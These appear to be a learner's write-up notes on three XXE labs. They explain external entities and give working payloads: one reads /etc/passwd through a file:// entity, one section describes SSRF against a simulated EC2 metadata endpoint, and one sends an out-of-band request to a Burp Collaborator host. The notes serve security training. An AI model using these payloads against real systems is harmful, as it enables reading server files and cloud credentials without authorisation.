## Exploiting XXE using external entities to retrieve files
- This lab has a check stock feature that parses XML input and returns any unexpected values in the response. To solve the lab, inject an XML external entity to retrieve the contents of the `etc/passwd` file.
- Let's learn a bit about XXE at first. Web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows viewing of files on the application server filesystem. May also allow interaction with back-end or external systems that the application itself can access.
- Apps use XML format to transmit data between browser and server. Apps that do this virtually always use a standard library or platform API to process the XML data on the server. Vulns arise because the XML specification contains various potentially dangerous features, and standard parsers support these features even if they are not normally used by the app.
- XML external entities are a type of custom XML entity whose defined values are loaded from outside of the DTD in which they are declared. External entities are particularly interesting from a security perspective because they allow an entity to be defined based on the contents of a file path or URL.
  - [DTD](https://www.w3schools.com/xml/xml_dtd_intro.asp)
  - For more on entities, [see](https://www.w3schools.com/xml/xml_dtd_entities.asp). The syntax is as follows: `<!ENTITY entity-name SYSTEM "URI/URL">` Refer to an entity in XML by `&entity-name;`
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>2</storeId></stockCheck>
```

![image](https://github.com/user-attachments/assets/8b7cc000-507d-4896-95cc-c87e5ad1c674)

## Exploiting XXE to perform SSRF attacks 
- Check stock feature parses XML input and returns any unexpected values in the response. Lab is running a simulated EC2 metadata endpoint at the default URL, which is https://169.254.169.254/. Endpoint can be used to retrieve data about the instance, some of which may be sensitive.

![image](https://github.com/user-attachments/assets/9245f007-a1d3-48ce-816c-5e6546fc67be)

## Blind XXE with out-of-band interaction
- Lab has check stock feature that parses XML input but does not display the result. Can detect blind XXE by triggering out-of-band-interactions with an external domain. To solve the lab, use external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://2uxjy21khbxivrd3pm9imsl7jyppdf14.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>
```

- You should see a DNS and HTTP request in your Collaborator. 
